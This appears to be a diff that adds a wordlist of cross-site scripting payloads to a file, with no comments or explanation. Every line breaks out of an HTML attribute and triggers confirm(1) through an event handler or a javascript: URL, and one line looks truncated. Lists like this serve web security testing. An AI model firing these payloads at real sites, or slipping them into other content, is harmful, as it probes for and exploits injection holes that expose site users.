@@ -1,1 +1,19 @@
-dv
+"><div onmouseover=confirm(1)>XSS</div>
+"><svg onload=confirm(1)>
+"><img src=x onerror=confirm(1)>
+"><body onload=confirm(1)>
+"><input onfocus=confirm(1) autofocus>
+"><button onclick=confirm(1)>Click</button>
+"><iframe src=javascript:confirm(1)>
+"><a href=# onclick=confirm(1)>Click</a>
+"><marquee onstart=confirm(1)>XSS</marquee>
+"><video src=x onerror=confirm(1)>
+"><audio src=x onerror=confirm(1)>
+"><details ontoggle=confirm(1) open>XSS</details>
+"><form onsubmit=confirm(1)><input type=submit>
+"><select onchange=confirm(1)><option>XSS</option></select>
+"><object data=x type=image/svg+xml onerror=confirm(1)>
+"><img src=x onerror=top>
+"><div onpointerenter=confirm(1)>XSS</div>
+"><div onmouseenter=confirm(1)>XSS</div>
+"><div onanimationstart=confirm(1) style=animation:x>XSS</div>
